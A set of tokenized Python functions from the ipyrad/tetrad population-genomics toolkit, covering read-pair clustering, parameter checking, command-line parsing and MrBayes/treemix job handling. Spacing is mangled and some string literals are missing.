read1 . get reference positions ( full length = True ) seed r1start = min ( poss ) seed r1end = max ( poss ) ## store the seed ------------------------------------------- if read1 . is reverse : seq = revcomp ( read1 . seq ) else : seq = read1 . seq ## store, could write orient but just + for now. size = sfunc ( rkeys [ 0 ] ) clust . append ( ">{}:{}:{};size={};*\n{}" . format ( chrom , seed r1start , seed r1end , size , seq ) ) ## If there's only one hit in this region then rkeys will only have ## one element and the call to `rkeys[1:]` will raise. Test for this. if len ( rkeys ) > 1 : ## store the hits to the seed ------------------------------- for key in rkeys [ 1 : ] : skip = False try : read1 = rdict [ key ] except Value Error : ## enter values that will make this read get skipped read1 = rdict [ key ] [ 0 ] skip = True ## orient reads only if not skipping if not skip : poss = read1 . get reference positions ( full length = True ) minpos = min ( poss ) maxpos = max ( poss ) ## store the seq if read1 . is reverse : seq = revcomp ( read1 . seq ) else : seq = read1 . seq ## store, could write orient but just + for now. size = sfunc ( key ) clust . append ( ">{}:{}:{};size={};+\n{}" . format ( chrom , minpos , maxpos , size , seq ) ) else : ## seq is excluded, though, we could save it and return ## it as a separate cluster that will be aligned separately. pass return clust
def fetch cluster pairs ( data , samfile , chrom , rstart , rend ) : ## store pairs rdict = { } clust = [ ] ## grab the region and make tuples of info iterreg = samfile . fetch ( chrom , rstart , rend ) ## use dict to match up read pairs for read in iterreg : if read . qname not in rdict : rdict [ read . qname ] = [ read ] else : rdict [ read . qname ] . append ( read ) ## sort dict keys so highest derep is first ('seed') sfunc = lambda x : int ( x . split ( ";size=" ) [ 1 ] . split ( ";" ) [ 0 ] ) rkeys = sorted ( rdict . keys ( ) , key = sfunc , reverse = True ) ## get blocks from the seed for filtering, bail out if seed is not paired try : read1 , read2 = rdict [ rkeys [ 0 ] ] except Value Error : return 0 ## the starting blocks for the seed poss = read1 . get reference positions ( ) + read2 . get reference positions ( ) seed r1start = min ( poss ) seed r2end = max ( poss ) ## store the seed ------------------------------------------- ## Simplify. R1 and R2 are always on opposite strands, but the ## orientation is variable. We revcomp and order the reads to ## preserve genomic order. reads overlap = False if read1 . is reverse : if read2 . aend > read1 . get blocks ( ) [ 0 ] [ 0 ] : reads overlap = True seq = read2 . seq + "nnnn" + revcomp ( read1 . seq ) else : seq = read2 . seq + "nnnn" + read1 . seq else : if read1 . aend > read2 . get blocks ( ) [ 0 ] [ 0 ] : reads overlap = True seq = read1 . seq + "nnnn" + revcomp ( read2 . seq ) else : seq = read1 . seq + "nnnn" + read2 . seq ## store, could write orient but just + for now. size = sfunc ( rkeys [ 0 ] ) clust . append ( ">{}:{}:{};size={};*\n{}" . format ( chrom , seed r1start , seed r2end , size , seq ) ) ## If there's only one hit in this region then rkeys will only have ## one element and the call to `rkeys[1:]` will raise. Test for this. if len ( rkeys ) > 1 : ## store the hits to the seed ------------------------------- for key in rkeys [ 1 : ] : skip = False try : read1 , read2 = rdict [ key ] except Value Error : ## enter values that will make this read get skipped read1 = rdict [ key ] [ 0 ] read2 = read1 skip = True ## orient reads and filter out ones that will not align well b/c ## they do not overlap enough with the seed poss = read1 . get reference positions ( ) + read2 . get reference positions ( ) minpos = min ( poss ) maxpos = max ( poss ) ## skip if more than one hit location if read1 . has tag ( "SA" ) or read2 . has tag ( "SA" ) : skip = True ## store if read passes  if ( abs ( minpos - seed r1start ) < 50 ) and ( abs ( maxpos - seed r2end ) < 50 ) and ( not skip ) : ## store the seq if read1 . is reverse : ## do reads overlap if read2 . aend > read1 . get blocks ( ) [ 0 ] [ 0 ] : reads overlap = True seq = read2 . seq + "nnnn" + revcomp ( read1 . seq ) else : seq = read2 . seq + "nnnn" + read1 . seq else : if read1 . aend > read2 . get blocks ( ) [ 0 ] [ 0 ] : reads overlap = True seq = read1 . seq + "nnnn" + revcomp ( read2 . seq ) else : seq = read1 . seq + "nnnn" + read2 . seq ## store, could write orient but just + for now. size = sfunc ( key ) clust . append ( ">{}:{}:{};size={};+\n{}" . format ( chrom , minpos , maxpos , size , seq ) ) else : ## seq is excluded, though, we could save it and return ## it as a separate cluster that will be aligned separately. pass ## merge the pairs prior to returning them ## Remember, we already tested for quality scores, so ## merge after pysam will generate arbitrarily high scores ## It would be nice to do something here like test if ## the average insert length + 2 stdv is > 2*read len ## so you can switch off merging for mostly non-overlapping data if reads overlap : if data . hackersonly [ "refmap merge PE" ] : clust = merge after pysam ( data , clust ) #clust = merge pair pipes(data, clust) return clust
def refmap init ( data , sample , force ) : ## make some persistent file handles for the refmap reads files sample . files . unmapped reads = os . path . join ( data . dirs . edits , "{}-refmap derep.fastq" . format ( sample . name ) ) sample . files . mapped reads = os . path . join ( data . dirs . refmapping , "{}-mapped-sorted.bam" . format ( sample . name ) )
def parse command line ( ) : ## create the parser parser = argparse . Argument Parser ( formatter class = argparse . Raw Description Help Formatter , epilog = ) ## get version from ipyrad  ipyversion = str ( pkg resources . get distribution ( 'ipyrad' ) ) parser . add argument ( '-v' , '--version' , action = 'version' , version = "tetrad " + ipyversion . split ( ) [ 1 ] ) parser . add argument ( '-f' , "--force" , action = 'store true' , help = "force overwrite of existing data" ) parser . add argument ( '-s' , metavar = "seq" , dest = "seq" , type = str , default = None , help = "path to input phylip file (only SN Ps)" ) parser . add argument ( '-j' , metavar = 'json' , dest = "json" , type = str , default = None , help = "load checkpointed/saved analysis from JSON file." ) parser . add argument ( '-m' , metavar = "method" , dest = "method" , type = str , default = "all" , help = "method for sampling quartets (all, random, or equal)" ) parser . add argument ( '-q' , metavar = "nquartets" , dest = "nquartets" , type = int , default = 0 , help = "number of quartets to sample (if not -m all)" ) parser . add argument ( '-b' , metavar = "boots" , dest = "boots" , type = int , default = 0 , help = "number of non-parametric bootstrap replicates" ) parser . add argument ( '-l' , metavar = "map file" , dest = "map" , type = str , default = None , help = "map file of snp linkages (e.g., ipyrad .snps.map)" ) parser . add argument ( '-r' , metavar = "resolve" , dest = 'resolve' , type = int , default = 1 , help = "randomly resolve heterozygous sites (default=1)" ) parser . add argument ( '-n' , metavar = "name" , dest = "name" , type = str , default = "test" , help = "output name prefix (default: 'test')" ) parser . add argument ( '-o' , metavar = "workdir" , dest = "workdir" , type = str , default = "./analysis-tetrad" , help = "output directory (default: creates ./analysis-tetrad)" ) parser . add argument ( '-t' , metavar = "starting tree" , dest = "tree" , type = str , default = None , help = "newick file starting tree for equal splits sampling" ) parser . add argument ( "-c" , metavar = "CP Us/cores" , dest = "cores" , type = int , default = 0 , help = "setting -c improves parallel efficiency with --MPI" ) parser . add argument ( "-x" , metavar = "random seed" , dest = "rseed" , type = int , default = None , help = "random seed for quartet sampling and/or bootstrapping" ) parser . add argument ( '-d' , "--debug" , action = 'store true' , help = "print lots more info to debugger: ipyrad log.txt." ) parser . add argument ( "--MPI" , action = 'store true' , help = "connect to parallel CP Us across multiple nodes" ) parser . add argument ( "--invariants" , action = 'store true' , help = "save a (large) database of all invariants" ) parser . add argument ( "--ipcluster" , metavar = "ipcluster" , dest = "ipcluster" , type = str , nargs = "?" , const = "default" , help = "connect to ipcluster profile (default: 'default')" ) ## if no args then return help message if len ( sys . argv ) == 1 : parser . print help ( ) sys . exit ( 1 ) ## parse args args = parser . parse args ( ) ## RAISE errors right away for some bad argument combinations: if args . method not in [ "random" , "equal" , "all" ] : raise I Pyrad Warning Exit ( "  method argument (-m) must be one of" + """ "all", "random", or "equal.\n""" ) ## if 'random' require nquarts argument #if args.method == 'random': #    if not args.nquartets: #        raise I Pyrad Warning Exit(\ #        "  Number of quartets (-q) is required with method = random\n") ## if 'equal' method require starting tree and nquarts # if args.method == 'equal': #     raise I Pyrad Warning Exit(\ #         "  The equal sampling method is currently for developers only.\n") #     if not args.nquartets: #         raise I Pyrad Warning Exit(\ #         "  Number of quartets (-q) is required with method = equal\n") #     if not args.tree: #         raise I Pyrad Warning Exit(\ #         "  Input guide tree (-t) is required with method = equal\n") ## required args if not any ( x in [ "seq" , "json" ] for x in vars ( args ) . keys ( ) ) : print ( ) parser . print help ( ) sys . exit ( 1 ) return args
def command list ( self ) : ## base args cmd = [ self . params . binary , "-i" , OPJ ( self . workdir , self . name + ".treemix.in.gz" ) , "-o" , OPJ ( self . workdir , self . name ) , ] ## addon params args = [ ] for key , val in self . params : if key not in [ "minmap" , "binary" ] : if key == "g" : if val [ 0 ] : args += [ "-" + key , str ( val [ 0 ] ) , str ( val [ 1 ] ) ] elif key == "global " : if val : args += [ "-" + key [ : - 1 ] ] elif key in [ "se" , "global" , "noss" ] : if val : args += [ "-" + key ] else : if val : args += [ "-" + key , str ( val ) ] return cmd + args
def subsample ( self ) : spans = self . maparr samp = np . zeros ( spans . shape [ 0 ] , dtype = np . uint64 ) for i in xrange ( spans . shape [ 0 ] ) : samp [ i ] = np . random . randint ( spans [ i , 0 ] , spans [ i , 1 ] , 1 ) return samp
def draw ( self , axes ) : ## create a toytree object from the treemix tree result tre = toytree . tree ( newick = self . results . tree ) tre . draw ( axes = axes , use edge lengths = True , tree style = 'c' , tip labels align = True , edge align style = { "stroke-width" : 1 } ) ## get coords  for admix in self . results . admixture : ## parse admix event pidx , pdist , cidx , cdist , weight = admix a = get admix point ( tre , pidx , pdist ) b = get admix point ( tre , cidx , cdist ) ## add line for admixture edge mark = axes . plot ( a = ( a [ 0 ] , b [ 0 ] ) , b = ( a [ 1 ] , b [ 1 ] ) , style = { "stroke-width" : 10 * weight , "stroke-opacity" : 0.95 , "stroke-linecap" : "round" } ) ## add points at admixture sink axes . scatterplot ( a = ( b [ 0 ] ) , b = ( b [ 1 ] ) , size = 8 , title = "weight: {}" . format ( weight ) , ) ## add scale bar for edge lengths axes . y . show = False axes . x . ticks . show = True axes . x . label . text = "Drift parameter" return axes
def run mbsum ( self , ipyclient , force = False , quiet = False ) : minidir = os . path . realpath ( os . path . join ( self . workdir , self . name ) ) trees1 = glob . glob ( os . path . join ( minidir , "*.run1.t" ) ) trees2 = glob . glob ( os . path . join ( minidir , "*.run2.t" ) ) ## clear existing files  existing = glob . glob ( os . path . join ( self . workdir , self . name , "*.sumt" ) ) if any ( existing ) : if force : for rfile in existing : os . remove ( rfile ) else : path = os . path . join ( self . workdir , self . name ) raise I Pyrad Warning Exit ( EXISTING SUMT FILES . format ( path ) ) ## load balancer lbview = ipyclient . load balanced view ( ) ## submit each to be processed asyncs = [ ] for tidx in xrange ( len ( trees1 ) ) : rep1 = trees1 [ tidx ] rep2 = trees2 [ tidx ] outname = os . path . join ( minidir , str ( tidx ) + ".sumt" ) async = lbview . apply ( call mbsum , * ( rep1 , rep2 , outname ) ) asyncs . append ( async ) ## track progress start = time . time ( ) printstr = "[mbsum] sum replicate runs      | {} | " while 1 : ready = [ i . ready ( ) for i in asyncs ] elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) if not quiet : progressbar ( len ( ready ) , sum ( ready ) , printstr . format ( elapsed ) , spacer = "" ) if len ( ready ) == sum ( ready ) : if not quiet : print ( "" ) break else : time . sleep ( 0.1 ) ## check success for async in asyncs : if not async . successful ( ) : raise I Pyrad Warning Exit ( async . result ( ) )
def run mrbayes ( self , ipyclient , force = False , quiet = False ) : ## get all the nexus files for this object minidir = os . path . realpath ( os . path . join ( self . workdir , self . name ) ) nexus files = glob . glob ( os . path . join ( minidir , "*.nex" ) ) ## clear existing files  #existing = glob.glob(os.path.join(self.workdir, self.name, "*.nex")) existing = glob . glob ( os . path . join ( minidir , "*.nex.*" ) ) if any ( existing ) : if force : for rfile in existing : os . remove ( rfile ) else : raise I Pyrad Warning Exit ( EXISTING NE Xdot FILES . format ( minidir ) ) ## write new nexus files, or should users do that before this? #self.write nexus files(force=True) ## load balancer lbview = ipyclient . load balanced view ( ) ## submit each to be processed asyncs = [ ] for nex in nexus files : async = lbview . apply ( call mb , nex ) asyncs . append ( async ) ## track progress start = time . time ( ) printstr = "[mb] infer gene-tree posteriors | {} | " while 1 : ready = [ i . ready ( ) for i in asyncs ] elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) if not quiet : progressbar ( len ( ready ) , sum ( ready ) , printstr . format ( elapsed ) , spacer = "" ) if len ( ready ) == sum ( ready ) : if not quiet : print ( "" ) break else : time . sleep ( 0.1 ) ## check success for async in asyncs : if not async . successful ( ) : raise I Pyrad Warning Exit ( async . result ( ) )
def paramschecker ( self , param , newvalue ) : if param == 'assembly name' : ## Make sure somebody doesn't try to change their assembly name, bad ## things would happen. Calling set params on assembly name only raises ## an informative error. Assembly name is set at Assembly creation time ## and is immutable. raise I Pyrad Warning Exit ( CANNOT CHANGE ASSEMBLY NAME ) elif param == 'project dir' : expandpath = expander ( newvalue ) if not expandpath . startswith ( "/" ) : if os . path . exists ( expandpath ) : expandpath = expander ( expandpath ) ## Forbid spaces in path names if " " in expandpath : raise I Pyrad Warning Exit ( BAD PROJDIR NAME . format ( expandpath ) ) self . paramsdict [ "project dir" ] = expandpath self . dirs [ "project" ] = expandpath ## `Merged:` in newvalue for raw fastq path indicates that this ## assembly is a merge of several others, so this param has no ## value for this assembly elif param == 'raw fastq path' : if newvalue and not "Merged:" in newvalue : fullrawpath = expander ( newvalue ) if os . path . isdir ( fullrawpath ) : raise I Pyrad Warning Exit ( RAW PATH ISDIR . format ( fullrawpath ) ) ## if something is found in path elif glob . glob ( fullrawpath ) : self . paramsdict [ 'raw fastq path' ] = fullrawpath ## else allow empty, tho it can still raise an error in step1 else : raise I Pyrad Warning Exit ( NO RAW FILE . format ( fullrawpath ) ) else : self . paramsdict [ 'raw fastq path' ] = "" ## `Merged:` in newvalue for barcodes path indicates that this ## assembly is a merge of several others, so this param has no ## value for this assembly elif param == 'barcodes path' : ## if a value was entered check that it exists if newvalue and not "Merged:" in newvalue : ## also allow for fuzzy match in names using glob fullbarpath = glob . glob ( expander ( newvalue ) ) [ 0 ] ## raise error if file is not found if not os . path . exists ( fullbarpath ) : raise I Pyrad Warning Exit ( BARCODE NOT FOUND . format ( fullbarpath ) ) else : self . paramsdict [ 'barcodes path' ] = fullbarpath self . link barcodes ( ) ## if no path was entered then set barcodes path to empty. ## this is checked again during step 1 and will raise an error ## if you try demultiplexing without a barcodes file else : self . paramsdict [ 'barcodes path' ] = newvalue ## `Merged:` in newvalue for sorted fastq path indicates that this ## assembly is a merge of several others, so this param has no ## value for this assembly elif param == 'sorted fastq path' : if newvalue and not "Merged:" in newvalue : fullsortedpath = expander ( newvalue ) if os . path . isdir ( fullsortedpath ) : raise I Pyrad Warning Exit ( SORTED ISDIR . format ( fullsortedpath ) ) elif glob . glob ( fullsortedpath ) : self . paramsdict [ 'sorted fastq path' ] = fullsortedpath else : raise I Pyrad Warning Exit ( SORTED NOT FOUND . format ( fullsortedpath ) ) ## if no value was entered then set to "". else : self . paramsdict [ 'sorted fastq path' ] = "" elif param == 'assembly method' : ## TEMPORARY BLOCK ON DENOVO+REFERENCE METHOD #        if newvalue == "denovo+reference": #            raise I Pyrad Warning Exit(""" #    Error: The 'denovo+reference' method is temporarily blocked while we  #    refactor it to greatly improve the speed. You can either revert to an #    older version (pre v.0.7.0) or wait for the next update to resume using #    this method.  #    """) methods = [ "denovo" , "reference" , "denovo+reference" , "denovo-reference" ] assert newvalue in methods , BAD ASSEMBLY METHOD . format ( newvalue ) self . paramsdict [ 'assembly method' ] = newvalue elif param == 'reference sequence' : if newvalue : fullrawpath = expander ( newvalue ) if not os . path . isfile ( fullrawpath ) : LOGGER . info ( "reference sequence file not found." ) raise I Pyrad Warning Exit ( REF NOT FOUND . format ( fullrawpath ) ) self . paramsdict [ 'reference sequence' ] = fullrawpath ## if no value was entered the set to "". Will be checked again ## at step3 if user tries to do refseq and raise error else : self . paramsdict [ 'reference sequence' ] = "" elif param == 'datatype' : ## list of allowed datatypes datatypes = [ 'rad' , 'gbs' , 'ddrad' , 'pairddrad' , 'pairgbs' , 'merged' , '2brad' , 'pair3rad' ] ## raise error if something else if str ( newvalue ) not in datatypes : raise I Pyrad Error ( . format ( newvalue , datatypes ) ) else : self . paramsdict [ 'datatype' ] = str ( newvalue ) ## link barcodes is called before datatypes is set ## we need to know the datatype so we can read in ## the multiplexed barcodes for 3rad. This seems ## a little annoying, but it was better than any ## alternatives I could think of. if "3rad" in self . paramsdict [ 'datatype' ] and not self . paramsdict [ 'sorted fastq path' ] . strip ( ) : if not "Merged:" in self . paramsdict [ 'barcodes path' ] : self . link barcodes ( ) elif param == 'restriction overhang' : newvalue = tuplecheck ( newvalue , str ) assert isinstance ( newvalue , tuple ) , ## Handle the special case where the user has 1 ## restriction overhang and does not include the trailing comma if len ( newvalue ) == 1 : ## for gbs users might not know to enter the second cut site ## so we do it for them. if self . paramsdict [ "datatype" ] == "gbs" : newvalue += newvalue else : newvalue += ( "" , ) #======= #    newvalue = (newvalue[0], "") #>>>>>>> d40a5d5086a0d0aace04dd08338ec4ba5341d1f2 ## Handle 3rad datatype with only 3 cutters if len ( newvalue ) == 3 : newvalue = ( newvalue [ 0 ] , newvalue [ 1 ] , newvalue [ 2 ] , "" ) assert len ( newvalue ) <= 4 , self . paramsdict [ 'restriction overhang' ] = newvalue elif param == 'max low qual bases' : assert isinstance ( int ( newvalue ) , int ) , self . paramsdict [ 'max low qual bases' ] = int ( newvalue ) elif param == 'phred Qscore offset' : assert isinstance ( int ( newvalue ) , int ) , "phred Qscore offset must be an integer." self . paramsdict [ 'phred Qscore offset' ] = int ( newvalue ) elif param == 'mindepth statistical' : assert isinstance ( int ( newvalue ) , int ) , "mindepth statistical must be an integer." ## do not allow values below 5 if int ( newvalue ) < 5 : raise I Pyrad Error ( ) else : self . paramsdict [ 'mindepth statistical' ] = int ( newvalue ) elif param == 'mindepth majrule' : assert isinstance ( int ( newvalue ) , int ) , "mindepth majrule must be an integer." self . paramsdict [ 'mindepth majrule' ] = int ( newvalue ) elif param == 'maxdepth' : self . paramsdict [ 'maxdepth' ] = int ( newvalue ) elif param == 'clust threshold' : newvalue = float ( newvalue ) assert ( newvalue < 1 ) & ( newvalue > 0 ) , "clust threshold must be a decimal value between 0 and 1." self . paramsdict [ 'clust threshold' ] = newvalue elif param == 'max barcode mismatch' : self . paramsdict [ 'max barcode mismatch' ] = int ( newvalue ) elif param == 'filter adapters' : self . paramsdict [ 'filter adapters' ] = int ( newvalue ) elif param == 'filter min trim len' : self . paramsdict [ "filter min trim len" ] = int ( newvalue ) elif param == 'max alleles consens' : self . paramsdict [ 'max alleles consens' ] = int ( newvalue ) elif param == 'max Ns consens' : newvalue = tuplecheck ( newvalue , int ) assert isinstance ( newvalue , tuple ) , "max Ns consens should be a tuple e.g., (8, 8)" self . paramsdict [ 'max Ns consens' ] = newvalue elif param == 'max Hs consens' : newvalue = tuplecheck ( newvalue , int ) assert isinstance ( newvalue , tuple ) , "max Hs consens should be a tuple e.g., (5, 5)" self . paramsdict [ 'max Hs consens' ] = newvalue elif param == 'min samples locus' : self . paramsdict [ 'min samples locus' ] = int ( newvalue ) elif param == 'max shared Hs locus' : if isinstance ( newvalue , str ) : if newvalue . isdigit ( ) : newvalue = int ( newvalue ) else : try : newvalue = float ( newvalue ) except Exception as inst : raise I Pyrad Params Error ( . format ( newvalue ) ) self . paramsdict [ 'max shared Hs locus' ] = newvalue elif param == 'max SN Ps locus' : newvalue = tuplecheck ( newvalue , int ) assert isinstance ( newvalue , tuple ) , "max SN Ps locus should be a tuple e.g., (20, 20)" self . paramsdict [ 'max SN Ps locus' ] = newvalue elif param == 'max Indels locus' : newvalue = tuplecheck ( newvalue , int ) assert isinstance ( newvalue , tuple ) , "max Indels locus should be a tuple e.g., (5, 100)" self . paramsdict [ 'max Indels locus' ] = newvalue ## deprecated but retained for legacy, now uses trim reads (below) elif param == 'edit cutsites' : ## Force into a string tuple newvalue = tuplecheck ( newvalue ) ## try converting each tup element to ints newvalue = list ( newvalue ) for i in range ( 2 ) : try : newvalue [ i ] = int ( newvalue [ i ] ) except ( Value Error , Index Error ) : newvalue . append ( 0 ) pass newvalue = tuple ( newvalue ) ## make sure we have a nice tuple if not isinstance ( newvalue , tuple ) : raise I Pyrad Warning Exit ( . format ( newvalue ) ) self . paramsdict [ 'edit cutsites' ] = newvalue elif param == 'trim reads' : ## Force into a string tuple newvalue = tuplecheck ( newvalue ) ## try converting each tup element to ints newvalue = list ( newvalue ) for i in range ( 4 ) : try : newvalue [ i ] = int ( newvalue [ i ] ) except ( Value Error , Index Error ) : newvalue . append ( 0 ) pass newvalue = tuple ( newvalue ) ## make sure we have a nice tuple if not isinstance ( newvalue , tuple ) : raise I Pyrad Warning Exit ( . format ( newvalue ) ) self . paramsdict [ 'trim reads' ] = newvalue ## deprecated but retained for legacy, now named trim loci  elif param == 'trim overhang' : newvalue = tuplecheck ( newvalue , str ) assert isinstance ( newvalue , tuple ) , "trim overhang should be a tuple e.g., (4, *, *, 4)" self . paramsdict [ 'trim overhang' ] = tuple ( [ int ( i ) for i in newvalue ] ) elif param == 'trim loci' : newvalue = tuplecheck ( newvalue , str ) assert isinstance ( newvalue , tuple ) , "trim overhang should be a tuple e.g., (0, -5, -5, 0)" self . paramsdict [ 'trim loci' ] = tuple ( [ int ( i ) for i in newvalue ] ) elif param == 'output formats' : ## let's get whatever the user entered as a tuple of letters allowed = assemble . write outfiles . OUTPUT FORMATS . keys ( ) #<<<<<<< HEAD ## Handle the case where output formats is an empty string if isinstance ( newvalue , str ) : ## strip commas and spaces from string so we have only letters newvalue = newvalue . replace ( "," , "" ) . replace ( " " , "" ) newvalue = list ( newvalue ) if not newvalue : newvalue = [ "*" ] if isinstance ( newvalue , tuple ) : newvalue = list ( newvalue ) #======= #if isinstance(newvalue, tuple): #    newvalue = list(newvalue) #if isinstance(newvalue, str): #    newvalue = [i.strip() for i in newvalue.split(",")] #    ## Handle the case where output formats is empty #    if not any(newvalue): #        newvalue = "*" #>>>>>>> 488144d1d97240b8b6f6caf9cfb6c023bb6ebb36 if isinstance ( newvalue , list ) : ## if more than letters, raise an warning if any ( [ len ( i ) > 1 for i in newvalue ] ) : LOGGER . warning ( ) newvalue = allowed newvalue = tuple ( newvalue ) #newvalue = tuple([i for i in newvalue if i in allowed]) if "*" in newvalue : newvalue = allowed ## set the param self . paramsdict [ 'output formats' ] = newvalue elif param == 'pop assign file' : fullpoppath = expander ( newvalue ) ## if a path is entered, raise exception if not found if newvalue : if not os . path . isfile ( fullpoppath ) : LOGGER . warn ( "Population assignment file not found." ) raise I Pyrad Warning Exit ( . format ( fullpoppath ) ) ## should we add a check here that all pop samples are in samples? self . paramsdict [ 'pop assign file' ] = fullpoppath self . link populations ( ) else : self . paramsdict [ 'pop assign file' ] = "" ## Don't forget to possibly blank the populations dictionary self . populations = { } return self
def stats ( self ) : nameordered = self . samples . keys ( ) nameordered . sort ( ) ## Set pandas to display all samples instead of truncating pd . options . display . max rows = len ( self . samples ) statdat = pd . Data Frame ( [ self . samples [ i ] . stats for i in nameordered ] , index = nameordered ) . dropna ( axis = 1 , how = 'all' ) # ensure non h,e columns print as ints for column in statdat : if column not in [ "hetero est" , "error est" ] : statdat [ column ] = np . nan to num ( statdat [ column ] ) . astype ( int ) return statdat
def files ( self ) : nameordered = self . samples . keys ( ) nameordered . sort ( ) ## replace curdir with . for shorter printing #fullcurdir = os.path.realpath(os.path.curdir) return pd . Data Frame ( [ self . samples [ i ] . files for i in nameordered ] , index = nameordered ) . dropna ( axis = 1 , how = 'all' )
def build stat ( self , idx ) : nameordered = self . samples . keys ( ) nameordered . sort ( ) newdat = pd . Data Frame ( [ self . samples [ i ] . stats dfs [ idx ] for i in nameordered ] , index = nameordered ) . dropna ( axis = 1 , how = 'all' ) return newdat
def get params ( self , param = "" ) : fullcurdir = os . path . realpath ( os . path . curdir ) if not param : for index , ( key , value ) in enumerate ( self . paramsdict . items ( ) ) : if isinstance ( value , str ) : value = value . replace ( fullcurdir + "/" , "./" ) sys . stdout . write ( "{}{:<4}{:<28}{:<45}\n" . format ( self . spacer , index , key , value ) ) else : try : if int ( param ) : #sys.stdout.write(self.paramsdict.values()[int(param)-1]) return self . paramsdict . values ( ) [ int ( param ) ] except ( Value Error , Type Error , Name Error , Index Error ) : try : return self . paramsdict [ param ] except Key Error : return 'key not recognized'
def step1func ( self , force , ipyclient ) : ## check input data files sfiles = self . paramsdict [ "sorted fastq path" ] rfiles = self . paramsdict [ "raw fastq path" ] ## do not allow both a sorted fastq path and a raw fastq if sfiles and rfiles : raise I Pyrad Warning Exit ( NOT TWO PATHS ) ## but also require that at least one exists if not ( sfiles or rfiles ) : raise I Pyrad Warning Exit ( NO SEQ PATH FOUND ) ## print headers if self . headers : if sfiles : print ( "\n{}Step 1: Loading sorted fastq data to Samples" . format ( self . spacer ) ) else : print ( "\n{}Step 1: Demultiplexing fastq data to Samples" . format ( self . spacer ) ) ## if Samples already exist then no demultiplexing if self . samples : if not force : print ( SAMPLES EXIST . format ( len ( self . samples ) , self . name ) ) else : ## overwrite existing data else do demux if glob . glob ( sfiles ) : self . link fastqs ( ipyclient = ipyclient , force = force ) else : assemble . demultiplex . run2 ( self , ipyclient , force ) ## Creating new Samples else : ## first check if demultiplexed files exist in sorted path if glob . glob ( sfiles ) : self . link fastqs ( ipyclient = ipyclient ) ## otherwise do the demultiplexing else : assemble . demultiplex . run2 ( self , ipyclient , force )
def step2func ( self , samples , force , ipyclient ) : ## print header if self . headers : print ( "\n  Step 2: Filtering reads " ) ## If no samples in this assembly then it means you skipped step1, if not self . samples . keys ( ) : raise I Pyrad Warning Exit ( FIRST RUN 1 ) ## Get sample objects from list of strings, if API. samples = get samples ( self , samples ) if not force : ## print warning and skip if all are finished if all ( [ i . stats . state >= 2 for i in samples ] ) : print ( EDITS EXIST . format ( len ( samples ) ) ) return ## Run samples through rawedit assemble . rawedit . run2 ( self , samples , force , ipyclient )
def step3func ( self , samples , noreverse , maxindels , force , ipyclient ) : ## print headers if self . headers : print ( "\n  Step 3: Clustering/Mapping reads" ) ## Require reference seq for reference-based methods if self . paramsdict [ 'assembly method' ] != "denovo" : if not self . paramsdict [ 'reference sequence' ] : raise I Pyrad Error ( REQUIRE REFERENCE PATH . format ( self . paramsdict [ "assembly method" ] ) ) else : ## index the reference sequence ## Allow force to reindex the reference sequence ## send to run on the cluster.  lbview = ipyclient . load balanced view ( ) async = lbview . apply ( index reference sequence , * ( self , force ) ) ## print a progress bar for the indexing start = time . time ( ) while 1 : elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) printstr = " {}    | {} | s3 |" . format ( "indexing reference" , elapsed ) finished = int ( async . ready ( ) ) progressbar ( 1 , finished , printstr , spacer = self . spacer ) if finished : print ( "" ) break time . sleep ( 0.9 ) ## error check if not async . successful ( ) : raise I Pyrad Warning Exit ( async . result ( ) ) ## Get sample objects from list of strings samples = get samples ( self , samples ) ## Check if all/none in the right state if not self . samples precheck ( samples , 3 , force ) : raise I Pyrad Error ( FIRST RUN 2 ) elif not force : ## skip if all are finished if all ( [ i . stats . state >= 3 for i in samples ] ) : print ( CLUSTERS EXIST . format ( len ( samples ) ) ) return ## run the step function assemble . cluster within . run ( self , samples , noreverse , maxindels , force , ipyclient )
def step4func ( self , samples , force , ipyclient ) : if self . headers : print ( "\n  Step 4: Joint estimation of error rate and heterozygosity" ) ## Get sample objects from list of strings samples = get samples ( self , samples ) ## Check if all/none in the right state if not self . samples precheck ( samples , 4 , force ) : raise I Pyrad Error ( FIRST RUN 3 ) elif not force : ## skip if all are finished if all ( [ i . stats . state >= 4 for i in samples ] ) : print ( JOINTS EXIST . format ( len ( samples ) ) ) return ## send to function assemble . jointestimate . run ( self , samples , force , ipyclient )
def step5func ( self , samples , force , ipyclient ) : ## print header if self . headers : print ( "\n  Step 5: Consensus base calling " ) ## Get sample objects from list of strings samples = get samples ( self , samples ) ## Check if all/none in the right state if not self . samples precheck ( samples , 5 , force ) : raise I Pyrad Error ( FIRST RUN 4 ) elif not force : ## skip if all are finished if all ( [ i . stats . state >= 5 for i in samples ] ) : print ( CONSENS EXIST . format ( len ( samples ) ) ) return ## pass samples to rawedit assemble . consens se . run ( self , samples , force , ipyclient )
def step6func ( self , samples , noreverse , force , randomseed , ipyclient , * * kwargs ) : ## Get sample objects from list of strings samples = get samples ( self , samples ) ## remove samples that aren't ready csamples = self . samples precheck ( samples , 6 , force ) ## print CLI header if self . headers : print ( "\n  Step 6: Clustering at {} similarity across {} samples" . format ( self . paramsdict [ "clust threshold" ] , len ( csamples ) ) ) ## Check if all/none in the right state if not csamples : raise I Pyrad Error ( FIRST RUN 5 ) elif not force : ## skip if all are finished if all ( [ i . stats . state >= 6 for i in csamples ] ) : print ( DATABASE EXISTS . format ( len ( samples ) ) ) return ## run if this point is reached. We no longer check for existing ## h5 file, since checking Sample states should suffice. assemble . cluster across . run ( self , csamples , noreverse , force , randomseed , ipyclient , * * kwargs )
def combinefiles ( filepath ) : ## unpack seq files in filepath fastqs = glob . glob ( filepath ) firsts = [ i for i in fastqs if " R1 " in i ] ## check names if not firsts : raise I Pyrad Warning Exit ( "First read files names must contain ' R1 '." ) ## get paired reads seconds = [ ff . replace ( " R1 " , " R2 " ) for ff in firsts ] return zip ( firsts , seconds )
def findbcode ( cutters , longbar , read1 ) : ## default barcode string for cutter in cutters [ 0 ] : ## If the cutter is unambiguous there will only be one. if not cutter : continue search = read1 [ 1 ] [ : int ( longbar [ 0 ] + len ( cutter ) + 1 ) ] barcode = search . rsplit ( cutter , 1 ) if len ( barcode ) > 1 : return barcode [ 0 ] ## No cutter found return barcode [ 0 ]
